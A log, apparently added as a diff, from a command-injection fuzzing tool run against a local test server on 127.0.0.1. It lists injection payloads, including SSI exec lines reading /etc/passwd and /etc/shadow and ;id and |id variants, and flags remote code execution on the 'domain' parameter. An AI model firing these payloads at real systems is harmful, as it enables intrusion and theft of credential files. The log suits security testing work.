@@ -1,0 +1,442 @@
+
+[1;36m[+] RECON PHASE: http://127.0.0.1:65412[0m
+[1;32m    [✓] No WAF detected — using 1s delay[0m
+[1;34m    [*] Server: BaseHTTP/0.6 Python/3.13.12[0m
+[1;34m    [*] Tech stack: ,PHP[0m
+[1;33m    [*] Recommended attacks: LFI/RCE[0m
+
+[1;33m[+] Anti-Cloaking Check...[0m
+    [*] Mobile: 12704B | GoogleBot: 12704B
+[1;32m    [✓] No cloaking detected.[0m
+
+[1;33m[+] Port Scan: 127.0.0.1[0m
+[1;33m    [*] No common ports open (or filtered)[0m
+[1;32m    [+] Recon report: /data/data/com.termux/files/home/scan_logs/report_20260401_101543.json[0m
+
+[1;33m[+] Discovering params from: http://127.0.0.1:65412[0m
+[1;32m    [+] Found 17 param(s): amp callback charset comment domain foobar id include name object path redir size term username v xml[0m
+[1;32m    [+] Loaded 83 payloads from PATT: command-execution-unix.txt[0m
+[1;35m    [*] Baseline size: 12704B (amp=dummy)[0m
+
+[1;36m[+] Fuzzing: http://127.0.0.1:65412?amp=FUZZ [Attack: rce | Max: 20 | Delay: ~1s][0m
+    [HTTP 200 | SIZE 12704B | DIFF 0B] &lt;!--#exec%20cmd=&quot;/bin/cat%20/etc/passwd&quot;--&gt;
+    [HTTP 200 | SIZE 12704B | DIFF 0B] &lt;!--#exec%20cmd=&quot;/bin/cat%20/etc/shadow&quot;--&gt;
+    [HTTP 200 | SIZE 12704B | DIFF 0B] &lt;!--#exec%20cmd=&quot;/usr/bin/id;--&gt;
+    [HTTP 200 | SIZE 12704B | DIFF 0B] &lt;!--#exec%20cmd=&quot;/usr/bin/id;--&gt;
+    [HTTP 200 | SIZE 12704B | DIFF 0B] /index.html|id|
+    [HTTP 200 | SIZE 12704B | DIFF 0B] ";id;"
+    [HTTP 200 | SIZE 12704B | DIFF 0B] ';id;'
+    [HTTP 200 | SIZE 12704B | DIFF 0B] ;id;
+    [HTTP 200 | SIZE 12704B | DIFF 0B] ;id
+    [HTTP 200 | SIZE 12704B | DIFF 0B] ;netstat -a;
+    [HTTP 200 | SIZE 12704B | DIFF 0B] "|id|"
+    [HTTP 200 | SIZE 12704B | DIFF 0B] '|id|'
+    [HTTP 200 | SIZE 12704B | DIFF 0B] |id
+    [HTTP 200 | SIZE 12704B | DIFF 0B] |/usr/bin/id
+    [HTTP 200 | SIZE 12704B | DIFF 0B] |id|
+    [HTTP 200 | SIZE 12704B | DIFF 0B] "|/usr/bin/id|"
+    [HTTP 200 | SIZE 12704B | DIFF 0B] '|/usr/bin/id|'
+    [HTTP 200 | SIZE 12704B | DIFF 0B] |/usr/bin/id|
+    [HTTP 200 | SIZE 12704B | DIFF 0B] "||/usr/bin/id|"
+    [HTTP 200 | SIZE 12704B | DIFF 0B] '||/usr/bin/id|'
+[1;32m    [✓] Fuzzing done. 20 payload(s) tested.[0m
+[1;35m    [*] Baseline size: 12704B (callback=dummy)[0m
+
+[1;36m[+] Fuzzing: http://127.0.0.1:65412?callback=FUZZ [Attack: rce | Max: 20 | Delay: ~1s][0m
+    [HTTP 200 | SIZE 12704B | DIFF 0B] &lt;!--#exec%20cmd=&quot;/bin/cat%20/etc/passwd&quot;--&gt;
+    [HTTP 200 | SIZE 12704B | DIFF 0B] &lt;!--#exec%20cmd=&quot;/bin/cat%20/etc/shadow&quot;--&gt;
+    [HTTP 200 | SIZE 12704B | DIFF 0B] &lt;!--#exec%20cmd=&quot;/usr/bin/id;--&gt;
+    [HTTP 200 | SIZE 12704B | DIFF 0B] &lt;!--#exec%20cmd=&quot;/usr/bin/id;--&gt;
+    [HTTP 200 | SIZE 12704B | DIFF 0B] /index.html|id|
+    [HTTP 200 | SIZE 12704B | DIFF 0B] ";id;"
+    [HTTP 200 | SIZE 12704B | DIFF 0B] ';id;'
+    [HTTP 200 | SIZE 12704B | DIFF 0B] ;id;
+    [HTTP 200 | SIZE 12704B | DIFF 0B] ;id
+    [HTTP 200 | SIZE 12704B | DIFF 0B] ;netstat -a;
+    [HTTP 200 | SIZE 12704B | DIFF 0B] "|id|"
+    [HTTP 200 | SIZE 12704B | DIFF 0B] '|id|'
+    [HTTP 200 | SIZE 12704B | DIFF 0B] |id
+    [HTTP 200 | SIZE 12704B | DIFF 0B] |/usr/bin/id
+    [HTTP 200 | SIZE 12704B | DIFF 0B] |id|
+    [HTTP 200 | SIZE 12704B | DIFF 0B] "|/usr/bin/id|"
+    [HTTP 200 | SIZE 12704B | DIFF 0B] '|/usr/bin/id|'
+    [HTTP 200 | SIZE 12704B | DIFF 0B] |/usr/bin/id|
+    [HTTP 200 | SIZE 12704B | DIFF 0B] "||/usr/bin/id|"
+    [HTTP 200 | SIZE 12704B | DIFF 0B] '||/usr/bin/id|'
+[1;32m    [✓] Fuzzing done. 20 payload(s) tested.[0m
+[1;35m    [*] Baseline size: 12704B (charset=dummy)[0m
+
+[1;36m[+] Fuzzing: http://127.0.0.1:65412?charset=FUZZ [Attack: rce | Max: 20 | Delay: ~1s][0m
+    [HTTP 200 | SIZE 12704B | DIFF 0B] &lt;!--#exec%20cmd=&quot;/bin/cat%20/etc/passwd&quot;--&gt;
+    [HTTP 200 | SIZE 12704B | DIFF 0B] &lt;!--#exec%20cmd=&quot;/bin/cat%20/etc/shadow&quot;--&gt;
+    [HTTP 200 | SIZE 12704B | DIFF 0B] &lt;!--#exec%20cmd=&quot;/usr/bin/id;--&gt;
+    [HTTP 200 | SIZE 12704B | DIFF 0B] &lt;!--#exec%20cmd=&quot;/usr/bin/id;--&gt;
+    [HTTP 200 | SIZE 12704B | DIFF 0B] /index.html|id|
+    [HTTP 200 | SIZE 12704B | DIFF 0B] ";id;"
+    [HTTP 200 | SIZE 12704B | DIFF 0B] ';id;'
+    [HTTP 200 | SIZE 12704B | DIFF 0B] ;id;
+    [HTTP 200 | SIZE 12704B | DIFF 0B] ;id
+    [HTTP 200 | SIZE 12704B | DIFF 0B] ;netstat -a;
+    [HTTP 200 | SIZE 12704B | DIFF 0B] "|id|"
+    [HTTP 200 | SIZE 12704B | DIFF 0B] '|id|'
+    [HTTP 200 | SIZE 12704B | DIFF 0B] |id
+    [HTTP 200 | SIZE 12704B | DIFF 0B] |/usr/bin/id
+    [HTTP 200 | SIZE 12704B | DIFF 0B] |id|
+    [HTTP 200 | SIZE 12704B | DIFF 0B] "|/usr/bin/id|"
+    [HTTP 200 | SIZE 12704B | DIFF 0B] '|/usr/bin/id|'
+    [HTTP 200 | SIZE 12704B | DIFF 0B] |/usr/bin/id|
+    [HTTP 200 | SIZE 12704B | DIFF 0B] "||/usr/bin/id|"
+    [HTTP 200 | SIZE 12704B | DIFF 0B] '||/usr/bin/id|'
+[1;32m    [✓] Fuzzing done. 20 payload(s) tested.[0m
+[1;35m    [*] Baseline size: 1319B (comment=dummy)[0m
+
+[1;36m[+] Fuzzing: http://127.0.0.1:65412?comment=FUZZ [Attack: rce | Max: 20 | Delay: ~1s][0m
+    [HTTP 200 | SIZE 1319B | DIFF 0B] &lt;!--#exec%20cmd=&quot;/bin/cat%20/etc/passwd&quot;--&gt;
+    [HTTP 200 | SIZE 1319B | DIFF 0B] &lt;!--#exec%20cmd=&quot;/bin/cat%20/etc/shadow&quot;--&gt;
+    [HTTP 200 | SIZE 1319B | DIFF 0B] &lt;!--#exec%20cmd=&quot;/usr/bin/id;--&gt;
+    [HTTP 200 | SIZE 1319B | DIFF 0B] &lt;!--#exec%20cmd=&quot;/usr/bin/id;--&gt;
+    [HTTP 200 | SIZE 1319B | DIFF 0B] /index.html|id|
+    [HTTP 200 | SIZE 1319B | DIFF 0B] ";id;"
+[1;33m    [HTTP 500 | SIZE 367B] FILE NOT FOUND: ';id;'[0m
+    [HTTP 200 | SIZE 1319B | DIFF 0B] ;id;
+    [HTTP 200 | SIZE 1319B | DIFF 0B] ;id
+    [HTTP 200 | SIZE 1319B | DIFF 0B] ;netstat -a;
+    [HTTP 200 | SIZE 1319B | DIFF 0B] "|id|"
+[1;33m    [HTTP 500 | SIZE 363B] FILE NOT FOUND: '|id|'[0m
+    [HTTP 200 | SIZE 1319B | DIFF 0B] |id
+    [HTTP 200 | SIZE 1319B | DIFF 0B] |/usr/bin/id
+    [HTTP 200 | SIZE 1319B | DIFF 0B] |id|
+    [HTTP 200 | SIZE 1319B | DIFF 0B] "|/usr/bin/id|"
+[1;33m    [HTTP 500 | SIZE 367B] FILE NOT FOUND: '|/usr/bin/id|'[0m
+    [HTTP 200 | SIZE 1319B | DIFF 0B] |/usr/bin/id|
+    [HTTP 200 | SIZE 1319B | DIFF 0B] "||/usr/bin/id|"
+[1;33m    [HTTP 500 | SIZE 367B] FILE NOT FOUND: '||/usr/bin/id|'[0m
+[1;32m    [✓] Fuzzing done. 20 payload(s) tested.[0m
+[1;35m    [*] Baseline size: 12704B (domain=dummy)[0m
+
+[1;36m[+] Fuzzing: http://127.0.0.1:65412?domain=FUZZ [Attack: rce | Max: 20 | Delay: ~1s][0m
+    [HTTP 000 | SIZE 0B | DIFF 12704B] &lt;!--#exec%20cmd=&quot;/bin/cat%20/etc/passwd&quot;--&gt;
+    [HTTP 000 | SIZE 0B | DIFF 12704B] &lt;!--#exec%20cmd=&quot;/bin/cat%20/etc/shadow&quot;--&gt;
+    [HTTP 000 | SIZE 0B | DIFF 12704B] &lt;!--#exec%20cmd=&quot;/usr/bin/id;--&gt;
+    [HTTP 000 | SIZE 0B | DIFF 12704B] &lt;!--#exec%20cmd=&quot;/usr/bin/id;--&gt;
+    [HTTP 000 | SIZE 0B | DIFF 12704B] /index.html|id|
+    [HTTP 000 | SIZE 0B | DIFF 12704B] ";id;"
+    [HTTP 000 | SIZE 0B | DIFF 12704B] ';id;'
+[1;31m    [HTTP 200 | SIZE 177B | DIFF +12527B] *** ANOMALY: ;id;[0m
+[1;31m    [!!!] STRATEGIC HIT: VULNERABLE (RCE: id command output detected)[0m
+[1;31m    [HTTP 200 | SIZE 177B | DIFF +12527B] *** ANOMALY: ;id[0m
+[1;31m    [!!!] STRATEGIC HIT: VULNERABLE (RCE: id command output detected)[0m
+[1;31m    [HTTP 200 | SIZE 252B | DIFF +12452B] *** ANOMALY: ;netstat -a;[0m
+[1;33m    [?] ANOMALY: ANOMALY (RCE: size diff=12452B)[0m
+    [HTTP 000 | SIZE 0B | DIFF 12704B] "|id|"
+    [HTTP 000 | SIZE 0B | DIFF 12704B] '|id|'
+[1;31m    [HTTP 200 | SIZE 176B | DIFF +12528B] *** ANOMALY: |id[0m
+[1;31m    [!!!] STRATEGIC HIT: VULNERABLE (RCE: id command output detected)[0m
+[1;31m    [HTTP 200 | SIZE 176B | DIFF +12528B] *** ANOMALY: |/usr/bin/id[0m
+[1;31m    [!!!] STRATEGIC HIT: VULNERABLE (RCE: id command output detected)[0m
+    [HTTP 000 | SIZE 0B | DIFF 12704B] |id|
+    [HTTP 000 | SIZE 0B | DIFF 12704B] "|/usr/bin/id|"
+    [HTTP 000 | SIZE 0B | DIFF 12704B] '|/usr/bin/id|'
+    [HTTP 000 | SIZE 0B | DIFF 12704B] |/usr/bin/id|
+    [HTTP 000 | SIZE 0B | DIFF 12704B] "||/usr/bin/id|"
+    [HTTP 000 | SIZE 0B | DIFF 12704B] '||/usr/bin/id|'
+[1;32m    [✓] Fuzzing done. 20 payload(s) tested.[0m
+[1;35m    [*] Baseline size: 12704B (foobar=dummy)[0m
+
+[1;36m[+] Fuzzing: http://127.0.0.1:65412?foobar=FUZZ [Attack: rce | Max: 20 | Delay: ~1s][0m
+    [HTTP 200 | SIZE 12704B | DIFF 0B] &lt;!--#exec%20cmd=&quot;/bin/cat%20/etc/passwd&quot;--&gt;
+    [HTTP 200 | SIZE 12704B | DIFF 0B] &lt;!--#exec%20cmd=&quot;/bin/cat%20/etc/shadow&quot;--&gt;
+    [HTTP 200 | SIZE 12704B | DIFF 0B] &lt;!--#exec%20cmd=&quot;/usr/bin/id;--&gt;
+    [HTTP 200 | SIZE 12704B | DIFF 0B] &lt;!--#exec%20cmd=&quot;/usr/bin/id;--&gt;
+    [HTTP 200 | SIZE 12704B | DIFF 0B] /index.html|id|
+    [HTTP 200 | SIZE 12704B | DIFF 0B] ";id;"
+    [HTTP 200 | SIZE 12704B | DIFF 0B] ';id;'
+    [HTTP 200 | SIZE 12704B | DIFF 0B] ;id;
+    [HTTP 200 | SIZE 12704B | DIFF 0B] ;id
+    [HTTP 200 | SIZE 12704B | DIFF 0B] ;netstat -a;
+    [HTTP 200 | SIZE 12704B | DIFF 0B] "|id|"
+    [HTTP 200 | SIZE 12704B | DIFF 0B] '|id|'
+    [HTTP 200 | SIZE 12704B | DIFF 0B] |id
+    [HTTP 200 | SIZE 12704B | DIFF 0B] |/usr/bin/id
+    [HTTP 200 | SIZE 12704B | DIFF 0B] |id|
+    [HTTP 200 | SIZE 12704B | DIFF 0B] "|/usr/bin/id|"
+    [HTTP 200 | SIZE 12704B | DIFF 0B] '|/usr/bin/id|'
+    [HTTP 200 | SIZE 12704B | DIFF 0B] |/usr/bin/id|
+    [HTTP 200 | SIZE 12704B | DIFF 0B] "||/usr/bin/id|"
+    [HTTP 200 | SIZE 12704B | DIFF 0B] '||/usr/bin/id|'
+[1;32m    [✓] Fuzzing done. 20 payload(s) tested.[0m
+[1;35m    [*] Baseline size: 357B (id=dummy)[0m
+
+[1;36m[+] Fuzzing: http://127.0.0.1:65412?id=FUZZ [Attack: rce | Max: 20 | Delay: ~1s][0m
+[1;33m    [HTTP 500 | SIZE 345B] FILE NOT FOUND: &lt;!--#exec%20cmd=&quot;/bin/cat%20/etc/passwd&quot;--&gt;[0m
+[1;33m    [HTTP 500 | SIZE 345B] FILE NOT FOUND: &lt;!--#exec%20cmd=&quot;/bin/cat%20/etc/shadow&quot;--&gt;[0m
+[1;33m    [HTTP 500 | SIZE 345B] FILE NOT FOUND: &lt;!--#exec%20cmd=&quot;/usr/bin/id;--&gt;[0m
+[1;33m    [HTTP 500 | SIZE 345B] FILE NOT FOUND: &lt;!--#exec%20cmd=&quot;/usr/bin/id;--&gt;[0m
+[1;33m    [HTTP 500 | SIZE 345B] FILE NOT FOUND: /index.html|id|[0m
+[1;31m    [HTTP 200 | SIZE 1338B | DIFF +981B] *** ANOMALY: ";id;"[0m
+[1;33m    [?] ANOMALY: ANOMALY (RCE: size diff=981B)[0m
+[1;31m    [HTTP 200 | SIZE 1338B | DIFF +981B] *** ANOMALY: ';id;'[0m
+[1;33m    [?] ANOMALY: ANOMALY (RCE: size diff=981B)[0m
+[1;33m    [HTTP 500 | SIZE 345B] FILE NOT FOUND: ;id;[0m
+[1;33m    [HTTP 500 | SIZE 345B] FILE NOT FOUND: ;id[0m
+[1;33m    [HTTP 500 | SIZE 345B] FILE NOT FOUND: ;netstat -a;[0m
+[1;31m    [HTTP 200 | SIZE 1338B | DIFF +981B] *** ANOMALY: "|id|"[0m
+[1;33m    [?] ANOMALY: ANOMALY (RCE: size diff=981B)[0m
+[1;31m    [HTTP 200 | SIZE 1338B | DIFF +981B] *** ANOMALY: '|id|'[0m
+[1;33m    [?] ANOMALY: ANOMALY (RCE: size diff=981B)[0m
+[1;33m    [HTTP 500 | SIZE 345B] FILE NOT FOUND: |id[0m
+[1;33m    [HTTP 500 | SIZE 345B] FILE NOT FOUND: |/usr/bin/id[0m
+[1;33m    [HTTP 500 | SIZE 345B] FILE NOT FOUND: |id|[0m
+[1;31m    [HTTP 200 | SIZE 1338B | DIFF +981B] *** ANOMALY: "|/usr/bin/id|"[0m
+[1;33m    [?] ANOMALY: ANOMALY (RCE: size diff=981B)[0m
+[1;31m    [HTTP 200 | SIZE 1338B | DIFF +981B] *** ANOMALY: '|/usr/bin/id|'[0m
+[1;33m    [?] ANOMALY: ANOMALY (RCE: size diff=981B)[0m
+[1;33m    [HTTP 500 | SIZE 345B] FILE NOT FOUND: |/usr/bin/id|[0m
+[1;31m    [HTTP 200 | SIZE 1338B | DIFF +981B] *** ANOMALY: "||/usr/bin/id|"[0m
+[1;33m    [?] ANOMALY: ANOMALY (RCE: size diff=981B)[0m
+[1;31m    [HTTP 200 | SIZE 1338B | DIFF +981B] *** ANOMALY: '||/usr/bin/id|'[0m
+[1;33m    [?] ANOMALY: ANOMALY (RCE: size diff=981B)[0m
+[1;32m    [✓] Fuzzing done. 20 payload(s) tested.[0m
+[1;35m    [*] Baseline size: 670B (include=dummy)[0m
+
+[1;36m[+] Fuzzing: http://127.0.0.1:65412?include=FUZZ [Attack: rce | Max: 20 | Delay: ~1s][0m
+[1;33m    [HTTP 500 | SIZE 711B] FILE NOT FOUND: &lt;!--#exec%20cmd=&quot;/bin/cat%20/etc/passwd&quot;--&gt;[0m
+[1;33m    [HTTP 500 | SIZE 711B] FILE NOT FOUND: &lt;!--#exec%20cmd=&quot;/bin/cat%20/etc/shadow&quot;--&gt;[0m
+[1;33m    [HTTP 500 | SIZE 695B] FILE NOT FOUND: &lt;!--#exec%20cmd=&quot;/usr/bin/id;--&gt;[0m
+[1;33m    [HTTP 500 | SIZE 695B] FILE NOT FOUND: &lt;!--#exec%20cmd=&quot;/usr/bin/id;--&gt;[0m
+[1;33m    [HTTP 500 | SIZE 667B] FILE NOT FOUND: /index.html|id|[0m
+[1;33m    [HTTP 500 | SIZE 658B] FILE NOT FOUND: ";id;"[0m
+[1;33m    [HTTP 500 | SIZE 658B] FILE NOT FOUND: ';id;'[0m
+[1;33m    [HTTP 500 | SIZE 656B] FILE NOT FOUND: ;id;[0m
+[1;33m    [HTTP 500 | SIZE 655B] FILE NOT FOUND: ;id[0m
+[1;33m    [HTTP 500 | SIZE 664B] FILE NOT FOUND: ;netstat -a;[0m
+[1;33m    [HTTP 500 | SIZE 658B] FILE NOT FOUND: "|id|"[0m
+[1;33m    [HTTP 500 | SIZE 658B] FILE NOT FOUND: '|id|'[0m
+[1;33m    [HTTP 500 | SIZE 655B] FILE NOT FOUND: |id[0m
+[1;33m    [HTTP 500 | SIZE 664B] FILE NOT FOUND: |/usr/bin/id[0m
+[1;33m    [HTTP 500 | SIZE 656B] FILE NOT FOUND: |id|[0m
+[1;33m    [HTTP 500 | SIZE 667B] FILE NOT FOUND: "|/usr/bin/id|"[0m
+[1;33m    [HTTP 500 | SIZE 667B] FILE NOT FOUND: '|/usr/bin/id|'[0m
+[1;33m    [HTTP 500 | SIZE 665B] FILE NOT FOUND: |/usr/bin/id|[0m
+[1;33m    [HTTP 500 | SIZE 668B] FILE NOT FOUND: "||/usr/bin/id|"[0m
+[1;33m    [HTTP 500 | SIZE 668B] FILE NOT FOUND: '||/usr/bin/id|'[0m
+[1;32m    [✓] Fuzzing done. 20 payload(s) tested.[0m
+[1;35m    [*] Baseline size: 300B (name=dummy)[0m
+
+[1;36m[+] Fuzzing: http://127.0.0.1:65412?name=FUZZ [Attack: rce | Max: 20 | Delay: ~1s][0m
+[1;33m    [HTTP 500 | SIZE 300B] FILE NOT FOUND: &lt;!--#exec%20cmd=&quot;/bin/cat%20/etc/passwd&quot;--&gt;[0m
+[1;33m    [HTTP 500 | SIZE 300B] FILE NOT FOUND: &lt;!--#exec%20cmd=&quot;/bin/cat%20/etc/shadow&quot;--&gt;[0m
+[1;33m    [HTTP 500 | SIZE 300B] FILE NOT FOUND: &lt;!--#exec%20cmd=&quot;/usr/bin/id;--&gt;[0m
+[1;33m    [HTTP 500 | SIZE 300B] FILE NOT FOUND: &lt;!--#exec%20cmd=&quot;/usr/bin/id;--&gt;[0m
+[1;33m    [HTTP 500 | SIZE 300B] FILE NOT FOUND: /index.html|id|[0m
+[1;33m    [HTTP 500 | SIZE 300B] FILE NOT FOUND: ";id;"[0m
+[1;33m    [HTTP 500 | SIZE 300B] FILE NOT FOUND: ';id;'[0m
+[1;33m    [HTTP 500 | SIZE 300B] FILE NOT FOUND: ;id;[0m
+[1;33m    [HTTP 500 | SIZE 300B] FILE NOT FOUND: ;id[0m
+[1;33m    [HTTP 500 | SIZE 300B] FILE NOT FOUND: ;netstat -a;[0m
+[1;33m    [HTTP 500 | SIZE 300B] FILE NOT FOUND: "|id|"[0m
+[1;33m    [HTTP 500 | SIZE 300B] FILE NOT FOUND: '|id|'[0m
+[1;33m    [HTTP 500 | SIZE 300B] FILE NOT FOUND: |id[0m
+[1;33m    [HTTP 500 | SIZE 300B] FILE NOT FOUND: |/usr/bin/id[0m
+[1;33m    [HTTP 500 | SIZE 300B] FILE NOT FOUND: |id|[0m
+[1;33m    [HTTP 500 | SIZE 300B] FILE NOT FOUND: "|/usr/bin/id|"[0m
+[1;33m    [HTTP 500 | SIZE 300B] FILE NOT FOUND: '|/usr/bin/id|'[0m
+[1;33m    [HTTP 500 | SIZE 300B] FILE NOT FOUND: |/usr/bin/id|[0m
+[1;33m    [HTTP 500 | SIZE 300B] FILE NOT FOUND: "||/usr/bin/id|"[0m
+[1;33m    [HTTP 500 | SIZE 300B] FILE NOT FOUND: '||/usr/bin/id|'[0m
+[1;32m    [✓] Fuzzing done. 20 payload(s) tested.[0m
+[1;35m    [*] Baseline size: 279B (object=dummy)[0m
+
+[1;36m[+] Fuzzing: http://127.0.0.1:65412?object=FUZZ [Attack: rce | Max: 20 | Delay: ~1s][0m
+[1;33m    [HTTP 500 | SIZE 275B] FILE NOT FOUND: &lt;!--#exec%20cmd=&quot;/bin/cat%20/etc/passwd&quot;--&gt;[0m
+[1;33m    [HTTP 500 | SIZE 275B] FILE NOT FOUND: &lt;!--#exec%20cmd=&quot;/bin/cat%20/etc/shadow&quot;--&gt;[0m
+[1;33m    [HTTP 500 | SIZE 275B] FILE NOT FOUND: &lt;!--#exec%20cmd=&quot;/usr/bin/id;--&gt;[0m
+[1;33m    [HTTP 500 | SIZE 275B] FILE NOT FOUND: &lt;!--#exec%20cmd=&quot;/usr/bin/id;--&gt;[0m
+[1;33m    [HTTP 500 | SIZE 275B] FILE NOT FOUND: /index.html|id|[0m
+[1;33m    [HTTP 500 | SIZE 275B] FILE NOT FOUND: ";id;"[0m
+[1;33m    [HTTP 500 | SIZE 278B] FILE NOT FOUND: ';id;'[0m
+[1;33m    [HTTP 500 | SIZE 275B] FILE NOT FOUND: ;id;[0m
+[1;33m    [HTTP 500 | SIZE 275B] FILE NOT FOUND: ;id[0m
+[1;33m    [HTTP 500 | SIZE 275B] FILE NOT FOUND: ;netstat -a;[0m
+[1;33m    [HTTP 500 | SIZE 275B] FILE NOT FOUND: "|id|"[0m
+[1;33m    [HTTP 500 | SIZE 278B] FILE NOT FOUND: '|id|'[0m
+[1;33m    [HTTP 500 | SIZE 275B] FILE NOT FOUND: |id[0m
+[1;33m    [HTTP 500 | SIZE 275B] FILE NOT FOUND: |/usr/bin/id[0m
+[1;33m    [HTTP 500 | SIZE 275B] FILE NOT FOUND: |id|[0m
+[1;33m    [HTTP 500 | SIZE 275B] FILE NOT FOUND: "|/usr/bin/id|"[0m
+[1;33m    [HTTP 500 | SIZE 278B] FILE NOT FOUND: '|/usr/bin/id|'[0m
+[1;33m    [HTTP 500 | SIZE 275B] FILE NOT FOUND: |/usr/bin/id|[0m
+[1;33m    [HTTP 500 | SIZE 275B] FILE NOT FOUND: "||/usr/bin/id|"[0m
+[1;33m    [HTTP 500 | SIZE 278B] FILE NOT FOUND: '||/usr/bin/id|'[0m
+[1;32m    [✓] Fuzzing done. 20 payload(s) tested.[0m
+[1;35m    [*] Baseline size: 435B (path=dummy)[0m
+
+[1;36m[+] Fuzzing: http://127.0.0.1:65412?path=FUZZ [Attack: rce | Max: 20 | Delay: ~1s][0m
+[1;33m    [HTTP 500 | SIZE 476B] FILE NOT FOUND: &lt;!--#exec%20cmd=&quot;/bin/cat%20/etc/passwd&quot;--&gt;[0m
+[1;33m    [HTTP 500 | SIZE 476B] FILE NOT FOUND: &lt;!--#exec%20cmd=&quot;/bin/cat%20/etc/shadow&quot;--&gt;[0m
+[1;33m    [HTTP 500 | SIZE 460B] FILE NOT FOUND: &lt;!--#exec%20cmd=&quot;/usr/bin/id;--&gt;[0m
+[1;33m    [HTTP 500 | SIZE 460B] FILE NOT FOUND: &lt;!--#exec%20cmd=&quot;/usr/bin/id;--&gt;[0m
+[1;33m    [HTTP 500 | SIZE 394B] FILE NOT FOUND: /index.html|id|[0m
+[1;33m    [HTTP 500 | SIZE 423B] FILE NOT FOUND: ";id;"[0m
+[1;33m    [HTTP 500 | SIZE 423B] FILE NOT FOUND: ';id;'[0m
+[1;33m    [HTTP 500 | SIZE 421B] FILE NOT FOUND: ;id;[0m
+[1;33m    [HTTP 500 | SIZE 420B] FILE NOT FOUND: ;id[0m
+[1;33m    [HTTP 500 | SIZE 429B] FILE NOT FOUND: ;netstat -a;[0m
+[1;33m    [HTTP 500 | SIZE 423B] FILE NOT FOUND: "|id|"[0m
+[1;33m    [HTTP 500 | SIZE 423B] FILE NOT FOUND: '|id|'[0m
+[1;33m    [HTTP 500 | SIZE 420B] FILE NOT FOUND: |id[0m
+[1;33m    [HTTP 500 | SIZE 429B] FILE NOT FOUND: |/usr/bin/id[0m
+[1;33m    [HTTP 500 | SIZE 421B] FILE NOT FOUND: |id|[0m
+[1;33m    [HTTP 500 | SIZE 432B] FILE NOT FOUND: "|/usr/bin/id|"[0m
+[1;33m    [HTTP 500 | SIZE 432B] FILE NOT FOUND: '|/usr/bin/id|'[0m
+[1;33m    [HTTP 500 | SIZE 430B] FILE NOT FOUND: |/usr/bin/id|[0m
+[1;33m    [HTTP 500 | SIZE 433B] FILE NOT FOUND: "||/usr/bin/id|"[0m
+[1;33m    [HTTP 500 | SIZE 433B] FILE NOT FOUND: '||/usr/bin/id|'[0m
+[1;32m    [✓] Fuzzing done. 20 payload(s) tested.[0m
+[1;35m    [*] Baseline size: 1013B (redir=dummy)[0m
+
+[1;36m[+] Fuzzing: http://127.0.0.1:65412?redir=FUZZ [Attack: rce | Max: 20 | Delay: ~1s][0m
+    [HTTP 200 | SIZE 1054B | DIFF 41B] &lt;!--#exec%20cmd=&quot;/bin/cat%20/etc/passwd&quot;--&gt;
+    [HTTP 200 | SIZE 1054B | DIFF 41B] &lt;!--#exec%20cmd=&quot;/bin/cat%20/etc/shadow&quot;--&gt;
+    [HTTP 200 | SIZE 1038B | DIFF 25B] &lt;!--#exec%20cmd=&quot;/usr/bin/id;--&gt;
+    [HTTP 200 | SIZE 1038B | DIFF 25B] &lt;!--#exec%20cmd=&quot;/usr/bin/id;--&gt;
+    [HTTP 200 | SIZE 1010B | DIFF 3B] /index.html|id|
+    [HTTP 200 | SIZE 1001B | DIFF 12B] ";id;"
+    [HTTP 200 | SIZE 1001B | DIFF 12B] ';id;'
+    [HTTP 200 | SIZE 999B | DIFF 14B] ;id;
+    [HTTP 200 | SIZE 998B | DIFF 15B] ;id
+    [HTTP 200 | SIZE 1007B | DIFF 6B] ;netstat -a;
+    [HTTP 200 | SIZE 1001B | DIFF 12B] "|id|"
+    [HTTP 200 | SIZE 1001B | DIFF 12B] '|id|'
+    [HTTP 200 | SIZE 998B | DIFF 15B] |id
+    [HTTP 200 | SIZE 1007B | DIFF 6B] |/usr/bin/id
+    [HTTP 200 | SIZE 999B | DIFF 14B] |id|
+    [HTTP 200 | SIZE 1010B | DIFF 3B] "|/usr/bin/id|"
+    [HTTP 200 | SIZE 1010B | DIFF 3B] '|/usr/bin/id|'
+    [HTTP 200 | SIZE 1008B | DIFF 5B] |/usr/bin/id|
+    [HTTP 200 | SIZE 1011B | DIFF 2B] "||/usr/bin/id|"
+    [HTTP 200 | SIZE 1011B | DIFF 2B] '||/usr/bin/id|'
+[1;32m    [✓] Fuzzing done. 20 payload(s) tested.[0m
+[1;35m    [*] Baseline size: 387B (size=dummy)[0m
+
+[1;36m[+] Fuzzing: http://127.0.0.1:65412?size=FUZZ [Attack: rce | Max: 20 | Delay: ~1s][0m
+[1;33m    [HTTP 500 | SIZE 428B] FILE NOT FOUND: &lt;!--#exec%20cmd=&quot;/bin/cat%20/etc/passwd&quot;--&gt;[0m
+[1;33m    [HTTP 500 | SIZE 428B] FILE NOT FOUND: &lt;!--#exec%20cmd=&quot;/bin/cat%20/etc/shadow&quot;--&gt;[0m
+[1;33m    [HTTP 500 | SIZE 412B] FILE NOT FOUND: &lt;!--#exec%20cmd=&quot;/usr/bin/id;--&gt;[0m
+[1;33m    [HTTP 500 | SIZE 412B] FILE NOT FOUND: &lt;!--#exec%20cmd=&quot;/usr/bin/id;--&gt;[0m
+[1;33m    [HTTP 500 | SIZE 384B] FILE NOT FOUND: /index.html|id|[0m
+[1;33m    [HTTP 500 | SIZE 375B] FILE NOT FOUND: ";id;"[0m
+[1;33m    [HTTP 500 | SIZE 375B] FILE NOT FOUND: ';id;'[0m
+[1;33m    [HTTP 500 | SIZE 373B] FILE NOT FOUND: ;id;[0m
+[1;33m    [HTTP 500 | SIZE 372B] FILE NOT FOUND: ;id[0m
+[1;33m    [HTTP 500 | SIZE 381B] FILE NOT FOUND: ;netstat -a;[0m
+[1;33m    [HTTP 500 | SIZE 375B] FILE NOT FOUND: "|id|"[0m
+[1;33m    [HTTP 500 | SIZE 375B] FILE NOT FOUND: '|id|'[0m
+[1;33m    [HTTP 500 | SIZE 372B] FILE NOT FOUND: |id[0m
+[1;33m    [HTTP 500 | SIZE 381B] FILE NOT FOUND: |/usr/bin/id[0m
+[1;33m    [HTTP 500 | SIZE 373B] FILE NOT FOUND: |id|[0m
+[1;33m    [HTTP 500 | SIZE 384B] FILE NOT FOUND: "|/usr/bin/id|"[0m
+[1;33m    [HTTP 500 | SIZE 384B] FILE NOT FOUND: '|/usr/bin/id|'[0m
+[1;33m    [HTTP 500 | SIZE 382B] FILE NOT FOUND: |/usr/bin/id|[0m
+[1;33m    [HTTP 500 | SIZE 385B] FILE NOT FOUND: "||/usr/bin/id|"[0m
